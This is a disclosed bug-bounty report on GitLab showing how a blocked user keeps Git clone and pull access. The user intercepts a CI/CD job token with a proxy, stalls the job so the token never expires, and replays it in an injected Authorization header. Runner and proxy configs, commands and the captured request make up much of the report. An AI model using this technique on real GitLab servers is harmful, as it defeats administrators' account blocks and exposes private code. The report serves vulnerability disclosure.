# Blocked user Git access through CI/CD token

## Report Details
- **Report ID**: 497047
- **URL**: https://hackerone.com/reports/497047
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-02-16T15:10:36.393Z
- **Disclosed**: 2019-12-13T17:56:30.481Z

## Reporter
- **Username**: logan5
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
###Summary

A blocked user does not have the ability to utilise Git client operations, GitLab UI access or API access.  However, a blocked user can still use Git clone/Git pull client commands if they are able to obtain a CI/CD token before being blocked.  This allows them to access projects they are already added to and any new internal projects.

There appears to be two possible bugs in the software that when combined can provide git pull/clone operations to a blocked user:

- Running CI/CD jobs don't take into account whether a user is blocked or not
- Manipulation of gitlab-runner output can result in a CI/CD job that never completes and surpasses timeout thresholds, thus the short lived CI/CD token never expires

The steps for reproducing the above are summarised below:

***Before user block:***
- Create a new project
- Install GitLab-runner and add to project
- Add a **.gitlab-ci.yml** file 
- Configure gitlab-runner http/git client connections to proxy through attacker's Burp Suite
- Start a job and intercept the request in Burp
- Capture request over HTTP from gitlab-runner Git client to clone/pull repository and obtain token
- Drop HTTP responses from Gitlab-runner, job will now run indefinitely
	
***After user block:***
- Configure attacker's Git client to use tinyproxy with additional CI/CD HTTP authorisation header added
- Carry out git pull/clone operations across repositories that blocked user had access to
	
###PoC setup

For this PoC, the following configuration will be used:

{F425063}


Attacker user account: **testuser1**

All systems are updated and using the latest version of GitLab.  There will be some additional example projects added that belong to other users that the attacker will have access to.  This is to demonstrate pull/clone operations after being blocked.


###PoC Part 1: Setup CI/CD

-As the attacker, create a new project called **block_poc**

{F425065}

-Within the **block_poc** project, set the CI/CD job timeout to be 10 minutes

{F425066}


-On the attacker's GitLab runner server **192.168.0.19**, install GitLab Runner using the below instructions and join it to the **block_poc** project using the unique token:

https://docs.gitlab.com/runner/install/linux-repository.html

>Note.  The executor was set to **shell**

-Configure the GitLab runner **192.168.0.19** to use the attacker's Burp Proxy on **192.168.0.9:8080**

```bash
$ mkdir /etc/systemd/system/gitlab-runner.service.d
$ vim /etc/systemd/system/gitlab-runner.service.d/http-proxy.conf   
        #Add the following content
	[Service]
	Environment="HTTP_PROXY=http://192.168.0.9:8080/"
$ :wq
$ systemctl daemon-reload
$ systemctl restart gitlab-runner
```

>Note.  Attacker's Burp proxy should listen on  **all** interfaces

-On the gitlab-runner server **192.168.0.19**, also proxy git client HTTP requests through the Burp Suite application on the attacker's client **192.168.0.9:8080**.  This is required as gitlab-runner will clone the repo using the git-client

```bash
$ su gitlab-runner
$ git config --global http.proxy http://192.168.0.9:8080
$ exit
```

-Within the **block_poc** project add a new **.gitlab-ci.yml** file with the following contents and commit it.

```yml
test:   
  script:     
    - echo "helloworld" > /tmp/test
```

{F425053}


###PoC Part 2: Obtain CI/CD token


-Turn on Burp Suite intercept and run the pipeline for the **block_poc** project.  Intercept the request that the gitlab-runner makes when it attempts to clone the repository.  This will contain the CI/CD token,   ***DO NOT SWITCH OFF THE INTERCEPT YET***

{F425055}


```
GET /testuser1/block_poc.git/info/refs?service=git-upload-pack HTTP/1.1
Host: 192.168.0.16
Authorization: Basic Z2l0bGFiLWNpLXRva2VuOlVwbnllR2plRlo4cV95UnptV1Fx
User-Agent: git/2.17.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US, *;q=0.9
Pragma: no-cache
Connection: close
```

The Token can be base64 decoded which will reveal the following:

==gitlab-ci-token:UpnyeGjeFZ8q_yRzmWQq==


-Continue moving through the HTTP requests in Burp until you encounter the gitlab-runner sending trace logs and a status update back to the GitLab server.  Drop these requests, usually there are about 2/3.

{F425054}
{F425057}

>Note.  There is no need to drop the runners standard job polling requests
   
-The CI/CD job is now in a continuous running state and as can be seen below and will not be terminated even if it passes the timeout threshold of 10 minutes.  The attacking user or a GitLab admin would have to manually stop the job, until that point, the CI/CD token is still active.

{F425056}


###PoC Part3: Token usage

-As the GitLab server root user, block the attacker user account **testuser1**

{F425058}
{F425059}

-As the attacker user, install Tinyproxy on the attacker's host **192.168.0.9**.  We will use this software as a forward proxy for the attacker's Git client and append the GitLab CI/CD token as a HTTP header for all outbound traffic

```bash
$ apt-get install tinyproxy
$ vim /etc/tinyproxy/tinyproxy.conf
	#Add the following content
	Port 1234    #changed from default
	AddHeader Authorization: Basic Z2l0bGFiLWNpLXRva2VuOlVwbnllR2plRlo4cV95UnptV1Fx
$ :wq
$ systemctl enable tinyproxy
$ systemctl start tinyproxy
```
>Note. Token above will change on each job run

>Note.  I believe you cannot manipulate the headers when Gitlab is running on HTTPS with Tinyproxy, this was only tested on HTTP.  However, you could manually test this step using Burp Suite if you want instead.  e.g. intercept a git client HTTP request to clone a repo and then add in the authorisation header.


-Configure the attacker's Git client on **192.168.0.9** to use the TinyProxy service

```bash
$ git config --global http.proxy http://127.0.0.1:1234
```

-As the attacker user, you can now carry out Git Pull operations on projects already downloaded locally or clone any new projects.  This is dependent on **tetuser1's** access permissions, but the user block in place has no effect.

```bash
#Clone testuser1-secret project
$ git clone http://192.168.0.16/testuser1/testuser1-secret.git
```

{F425060}


```bash
#Clone tetuser2/tetsuser2_new
#testuser1 granted developer permissions
$ git clone http://192.168.0.16/testuser2/testuser2_new.git
```

{F425061}

```bash
#Clone testuser2/internal_project
#new internal project added by testuser2 after testuser1 block
$ git clone http://192.168.0.16/testuser2/internal_project.git
```

{F425062}

## Impact

The above PoC has demonstrated that a blocked user still has the ability to carry out some Git operations (and possibly docker operations, although not tested) on existing or new projects, e.g. pull down new code or clone new internal projects.  However, this vulnerability could be halted by a GitLab administrator carrying out any of the below actions if detected:

- Manually terminate the hung CI/CD job which will invalidate the CI/CD token
- Delete the blocked user account
- Remove the **block_poc** project which would also terminate the job and the CI/CD token

Obviously the attacker would need to set the above up before their account was blocked, if it was blocked before they obtained to CI/CD token then they will not have access.

## Attachments
- image3-configfile.PNG
- image5-drop1.PNG
- image4-tokenintercept.PNG
- image7-timeout2.PNG
- image6-drop2.PNG
- image8-blockeduser.PNG
- image9-blockeduser2.PNG
- image10-bypass1.PNG
- image11-bypass2.PNG
- image12-bypass3.PNG
- setup.png
- image1-createproject.PNG
- image2-timeout.PNG
